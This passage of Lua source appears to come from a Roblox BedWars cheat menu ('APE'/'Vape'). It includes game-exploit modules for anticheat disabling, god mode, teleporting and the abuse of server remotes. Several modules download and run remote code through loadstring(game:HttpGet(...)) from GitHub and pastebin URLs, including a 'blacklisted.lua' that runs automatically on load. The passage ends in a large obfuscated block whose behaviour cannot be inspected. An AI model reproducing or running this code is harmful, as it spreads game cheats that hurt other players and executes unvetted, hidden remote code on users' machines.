						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)
	
runFunction(function()
    local VampireExploit = {Enabled = false}
    VampireExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "VxmpireExploit",
        Function = function(callback)
            if callback then 
                task.spawn(function()
                    table.insert(VampireExploit.Connections, lplr.CharacterAdded:Connect(function()
                        task.wait(1)
                        bedwars.ClientHandler:Get("CursedCoffinApplyVampirism"):SendToServer({player = lplr})
                    end))
                    bedwars.ClientHandler:Get("CursedCoffinApplyVampirism"):SendToServer({player = lplr})
                    warningNotification("APE", "SemiGodmode Hit Someone Will Regen", 12)					
                end)
            end
        end
    })
end)

	runFunction(function()
		local SecretExploit = {Enabled = false}
		SecretExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "SecretExploit",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/TheAPEConfig/main/Secret.lua"))()
					warningNotification("APE", "Applying Vxmpire To Other Players", 5)
					end)
				end
			end
		})
	end)

	runFunction(function()
		local HowlExploit = {Enabled = false}
		HowlExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "HowlExploit",
			Function = function(callback)
				if callback then
					task.spawn(function()
					  repeat
					    task.wait()
					    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/TheAPEConfig/main/Howl.lua"))()
						until (not HowlExploit.Enabled)
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)

do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 1>bd then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,((table.create or function(cs,ct)local cu,cv=0 while true do if cu<=1 then if 1~=cu then cv={}else for cw=1,cs do cv[cw]=ct;end;end else if 3>cu then return cv;else break end end cu=cu+1 end end)or tostring)else bl=1 end else if 3>bd then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if bk~=2 then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 4<bk then cx=1 else for bj=0,cv-1 do cw[bj]=bg(bj)end end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if bj~=2 then cx=cx+1 else da=bh(be(bi,cx,(cx+cz-1)),36)end end else if bj<=3 then cx=cx+cz else if 4==bj then return da else break end end end bj=bj+1 end end else if bk~=8 then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while cx<#bi and not(#a~=d)do local a=cy()if cw[a]then ct=cw[a]else ct=(cs..be(cs,1,1))end cw[cv]=(cs..be(ct,1,1))cu[#cu+1],cs,cv=ct,ct,(cv+1)end else if 11~=bk then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if 5~=bd then bo={}else c={y,m,j,w,l,o,s,k,q,i,x,u,nil,nil};end else if bd<=6 then bp=v else if 8~=bd then bq=bp(bo)else br,bs=1,(-4979+(function()local a,b,c,d=0 while true do if a<=1 then if 1~=a then b,c=0,1 else d=(function(q,s)local v=0 while true do if 1~=v then s(q(q,s),s(s and s,s and q))else break end v=v+1 end end)(function(q,s)local v=0 while true do if v<=2 then if v<=0 then if b>344 then return q end else if 2>v then b=(b+1)else c=(c*63)%6745 end end else if v<=3 then if((c%740)<370)then c=((c-199))%21041 return q else return s(s(q,s),s(q and q,(s and q)))end else if v~=5 then return s(s(s,q),s(s,s))else break end end end v=v+1 end end,function(q,s)local v=0 while true do if v<=2 then if v<=0 then if(b>106)then return s end else if v~=2 then b=b+1 else c=((c-323)%14480)end end else if v<=3 then if(c%470)<235 then return s(s(s,(q and s)),s(s,q))else return s end else if v~=5 then return q else break end end end v=v+1 end end)end else if a<3 then return c;else break end end a=a+1 end end)())end end end end else if bd<=12 then if bd<=10 then if bd<10 then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c>0 then for q=0,31 do local s=(a%2)local v=b%2 if not(s~=0)then if not(v~=1)then b=b-1 d=(d+2^q)end else a=(a-1)if not(v~=0)then d=(d+2^q)else b=b-1 end end b=(b/2)a=a/2 end else d=0 end else if 3~=c then return d else break end end c=c+1 end end end else if bd==11 then bv=function(a,b)local c=0 while true do if 1~=c then return(a*(2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 0==a then b,c=h(bn,br,(br+2))else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=(br+2);else if 4>a then return((bv(c,8))+b);else break end end end a=a+1 end end end end else if bd<=14 then if bd<14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if c>0 then break else return p(a/(2^b));end c=c+1 end end else if 17~=bd then bz=(2^32-1)else ca=function(a,b)local c=0 while true do if c<1 then return((a+b)-bu(a,b))/2 else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if bd==18 then cb=bw()else cc=function(a,b)local c=0 while true do if c<1 then return bz-ca(bz-a,bz-b)else break end c=c+1 end end end else if 20<bd then ce=bw()else cd=function(a,b,c)local d=0 while true do if 1>d then if c then local c=((a/2^(b-1))%2^((c-1)-(b-1)+1))return(c-(c%1))else local b=(2^(b-1))return(a%(b+b)>=b)and 1 or 0 end else break end d=d+1 end end end end else if bd<=23 then if bd~=23 then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 1~=a then b,c,d,p=h(bn,br,(br+3))else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=br+4;else if 4>a then return(bv(p,24)+bv(d,16)+bv(c,8))+b;else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if 0<a then br=br+1;else b=bu(h(bn,br,br),cb)end else if a<3 then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if 26>bd then ch=(-6933+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc=0 while true do if a<=11 then if a<=5 then if a<=2 then if a<=0 then b=151 else if 2>a then c=26651 else d=302 end end else if a<=3 then p=407 else if a<5 then q=606 else s=147 end end end else if a<=8 then if a<=6 then v=587 else if a==7 then w=1174 else x=45331 end end else if a<=9 then y=940 else if 11>a then be=249 else bf=46286 end end end end else if a<=17 then if a<=14 then if a<=12 then bg=937 else if a==13 then bh=1880 else bi=2 end end else if a<=15 then bj=49669 else if a>16 then bs=1 else bk=803 end end end else if a<=20 then if a<=18 then bw=462 else if 20>a then by=0 else bz,ca=by,bs end end else if a<=21 then cc=(function(ce,cs,ct)local cu=0 while true do if 1>cu then cs(ce(cs,cs,ct),ce(ce,cs,ce),ce(cs,ce,ce))else break end cu=cu+1 end end)(function(ce,cs,ct)local cu=0 while true do if cu<=2 then if cu<=0 then if(bz>bw)then local bw=by while true do bw=(bw+bs)if(bw<bi)then return cs else break end end end else if cu>1 then ca=(ca-bk)%bj else bz=(bz+bs)end end else if cu<=3 then if((ca%bh)<y)then local y=by while true do y=(y+bs)if((y>bi)or not(y~=bi))then if(y>bi)then break else return ce end else ca=(ca*bg)%bf end end else local y=by while true do y=(y+bs)if not(y~=bs)then return ce(cs(ce,ce,cs),ce(cs,ct,ce),cs(ct,cs,ce))else break end end end else if 4==cu then return ct(ce(ct,ce,cs),ce((cs and ce),ct,ct)and ct(cs,ct and ce,ct),cs((cs and ce),ce,ce))else break end end end cu=cu+1 end end,function(y,bf,bg)local bh=0 while true do if bh<=2 then if bh<=0 then if(bz>be)then local be=by while true do be=(be+bs)if not(not(be==bs))then return bg else break end end end else if bh<2 then bz=(bz+bs)else ca=(ca+p)%x end end else if bh<=3 then if(not((ca%w)~=v)or((ca%w)<v))then local p=by while true do p=(p+bs)if not(p~=bi)then break else return y end end else local p=by while true do p=(p+bs)if not(not(p==bs))then return y(bf(y,bf,(bf and bf)),bg(bf,bg,bf and bf),bf((bg and bf),y,bf))else break end end end else if 5>bh then return y(y(bf,y,y and y),bg(y,bf,y),(bf(bg,bf,bf)and bg(y,bg,bg)))else break end end end bh=bh+1 end end,function(p,v,w)local x=0 while true do if x<=2 then if x<=0 then if(bz>s)then local s=by while true do s=(s+bs)if s<bi then return w else break end end end else if x<2 then bz=(bz+bs)else ca=((ca*q)%c)end end else if x<=3 then if(not((ca%d)~=b)or(ca%d)<b)then local b=by while true do b=(b+bs)if(b<bi)then return w else break end end else local b=by while true do b=b+bs if not(b~=bs)then return p(w(v,w,w)and v(p,p,w),w(w,v,p),v(w,p,v))else break end end end else if x<5 then return v(v(v,v,p and p)and p(v,w,p),p(w,v and w,(p and v)),v(p,p,v))else break end end end x=x+1 end end)else if 23~=a then return ca;else break end end end end end a=a+1 end end)());else ci=(466+(function()local a=1698;local b=849;local c=299;local d=38356;local p=311;local q=218;local s=21995;local v=760;local w=380;local x=14766;local y=105;local be=23;local bf=1398;local bg=20514;local bh=525;local bi=699;local bj=181;local bk=16282;local bs=457;local bw=428;local by=3;local bz=613;local ca=74;local cc=1226;local ce=2;local cs=11734;local ct=480;local cu=1;local cv=406;local cw=0;local cx,cy=cw,cu;local a=(function(cz,da,db,dc)da(da(da,da,cz,cz),cz(db and cz,cz,da,dc and da),da((db and db),da,da,db and da),db(cz,db and da,db,db))end)(function(cz,da,db,dc)if(cx>cv)then local cv=cw while true do cv=cv+cu if not(cv~=ce)then break else return cz end end end cx=(cx+cu)cy=((cy-ct)%cs)if((cy%cc)==bz or(cy%cc)<bz)then local bz=cw while true do bz=(bz+cu)if(bz<cu or bz==cu)then cy=(cy*ca)%bk else if not(bz~=by)then break else return dc end end end else local bk=cw while true do bk=(bk+cu)if bk>cu then break else return cz(cz((cz and cz),db and dc,cz,dc),db(db and db,cz,cz,da),dc((dc and db),cz,db,db),db(dc,cz,dc,cz))end end end return db(da(db,db,db and da,da),da(dc,da,(db and dc),db),cz(dc,dc,cz,cz),da(da,dc,da,db)and dc(dc,da,dc,(dc and db)))end,function(bk,by,bz,ca)if cx>bw then local bw=cw while true do bw=(bw+cu)if not(bw~=cu)then return ca else break end end end cx=(cx+cu)cy=(cy*bs)%bj if((cy%bf)==bi or(cy%bf)>bi)then local bf=cw while true do bf=bf+cu if(bf<cu or bf==cu)then cy=(cy*bh)%bg else if not(bf~=ce)then return bk(bk((bk and ca),bz,ca,ca),bz((by and ca),by,(bk and bz),bk),bk(ca,by,by,ca),by(ca,ca,bk,bk))else break end end end else local bf=cw while true do bf=(bf+cu)if not(bf~=cu)then return by else break end end end return by end,function(bf,bg,bh,bi)if(cx>y)then local y=cw while true do y=(y+cu)if y>cu then break else return bh end end end cx=(cx+cu)cy=((cy+be)%x)if(cy%v)>w then local v=cw while true do v=(v+cu)if(v==ce or v>ce)then if v>ce then break else return bf(bg(bg,bh,bh,bg),bg(bh,bh,bh,bf),bi(bf,bh,bh and bi,bi),bg((bh and bf),bg,bi,bh))end else cy=((cy-q)%s)end end else local q=cw while true do q=q+cu if not(q~=cu)then return bi else break end end end return bg end,function(q,s,v,w)if cx>c then local c=cw while true do c=c+cu if not(c~=cu)then return v else break end end end cx=cx+cu cy=((cy*p)%d)if((cy%a)==b or(cy%a)<b)then local a=cw while true do a=(a+cu)if a<ce then return w(q(q and v,v,s,q)and v(v,s,q,s),q(w and w,s,w,w),w(q and w,(q and v),v,q and w),w(q,w,v,q))else break end end else local a=cw while true do a=(a+cu)if(a<ce)then return v else break end end end return w end)return cy;end)());end end end end else if bd<=31 then if bd<=28 then if 27==bd then cj=(-3284+(function()local a=21321;local b=25;local c=1004;local d=502;local p=212;local q=8374;local 